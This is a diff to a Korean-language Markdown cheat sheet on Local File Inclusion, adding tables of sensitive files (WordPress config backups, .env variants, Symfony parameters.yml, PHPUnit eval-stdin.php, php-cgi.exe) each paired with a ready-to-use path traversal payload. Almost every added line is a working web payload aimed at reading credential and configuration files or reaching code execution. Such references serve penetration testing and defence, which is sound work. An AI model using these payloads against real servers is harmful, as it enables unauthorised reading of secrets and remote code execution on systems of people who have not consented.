@@ -117,6 +117,12 @@
 | --------------- | ----------------- | ---------------------------------------------- |
 | `wp-config.php` | DB 접속 정보, 인증 키 포함 | `?page=../../../../var/www/html/wp-config.php` |
 | `.htaccess`     | 리다이렉션, 보안 설정 등 포함 | `?page=../../../../var/www/html/.htaccess`     |
+| `/config.php.zip`                      | 압축된 설정 파일, 내부 PHP 코드 포함 가능                           | `?page=../../../../var/www/html/config.php.zip`                |
+| `/wp-config.php.bk`                    | WordPress 백업 설정 파일, DB 정보 포함                         | `?page=../../../../var/www/html/wp-config.php.bk`              |
+| `/common/config.php.new`               | 신규 PHP 설정 파일                                         | `?page=../../../../var/www/html/common/config.php.new`         |
+| `/config.php.new`                      | 신규 PHP 설정 파일                                         | `?page=../../../../var/www/html/config.php.new`                |
+| `/phpunit/src/Util/PHP/eval-stdin.php` | PHPUnit 테스트용 스크립트, stdin으로 전달된 PHP 코드 실행 가능 → RCE 위험 | `?page=../../../../vendor/phpunit/src/Util/PHP/eval-stdin.php` |
+| `/php-cgi/php-cgi.exe`                 | PHP-CGI 실행 파일, misconfiguration 시 RCE 가능             | `?page=../../../../php-cgi/php-cgi.exe`                        |
 
 > 참고: PHP에서는 소스코드가 실행되어 내용을 볼 수 없지만, `php://filter` 사용 시 Base64로 출력 가능
 
@@ -156,6 +162,21 @@
 | `.env`         | 환경 변수 (DB, API 키 등)           | `?page=../../../../.env`         |
 | `config.js`    | 설정 파일 (자체 구성에 따라 민감 정보 포함 가능) | `?page=../../../../config.js`    |
 | `package.json` | 프로젝트 정보 및 스크립트                | `?page=../../../../package.json` |
+
+
+### 📘 Symfony / 프레임워크 설정 파일
+
+| 📄 파일 경로                          | 🔍 설명                    | 🔐 LFI URL 예시                                      |
+| --------------------------------- | ------------------------ | -------------------------------------------------- |
+| `/app/config/parameters.yml.dist` | 기본 설정 템플릿                | `?page=../../../../app/config/parameters.yml.dist` |
+| `/app/config/parameters.yml`      | 실제 환경 설정, DB 비밀번호 포함 가능  | `?page=../../../../app/config/parameters.yml`      |
+| `/ADMIN/.env`                     | 환경 변수 파일, 인증 정보 포함 가능    | `?page=../../../../ADMIN/.env`                     |
+| `/.env.staging`                   | 스테이징 환경 변수 파일            | `?page=../../../../.env.staging`                   |
+| `/.env.prod`                      | 프로덕션 환경 변수 파일            | `?page=../../../../.env.prod`                      |
+| `/_config.yml`                    | YAML 형식 설정 파일            | `?page=../../../../_config.yml`                    |
+| `/config/parameters.yml`          | 실제 설정 파일, DB/환경 정보 포함 가능 | `?page=../../../../config/parameters.yml`          |
+| `/config/parameters.yml.dist`     | 설정 파일 템플릿                | `?page=../../../../config/parameters.yml.dist`     |
+
 
 ---
 
